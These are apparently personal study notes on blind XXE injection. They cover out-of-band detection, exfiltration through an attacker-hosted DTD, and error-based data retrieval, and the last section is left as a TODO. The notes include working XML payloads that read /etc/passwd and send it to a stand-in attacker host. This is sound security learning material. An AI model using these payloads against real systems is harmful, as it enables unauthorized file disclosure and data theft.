## Detecting blind XXE using OAST techniques
You can detect blind XXE using the same technique as for [[XXE injection#Exploiting XXE to perform SSRF attacks]] but triggering an out-of-band interaction.

When XML regular entities are blocked we can use XML parameter entities instead
```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
```

## Exploiting blind XXE to exfiltrate data out-of-band
This involves the attacker hosting a malicious DTD on a system that they control, and then invkoing the external DTD from within the in-band XXE payload.

Malicious DTD example:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>"> 
%eval; 
%exfiltrate;
```

The attacker must submit the following XXE payload to the vulnerable application
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
```

This will cause the XML parser to fetch the external DTD and interpret it inline. The steps defined within the malicious DTD are then executed.

## Exploiting blind XXE to retrieve data via error messages
An alternative approach to exploiting blind XXE is to trigger an XML parsing error where the error message conatins the sensitive data thatt you wish to retireve.

Example malicious DTD:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd"> 
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> %eval; 
%error;
```

## Exploiting blind XXE by repurposing a local DTD
!!! TODO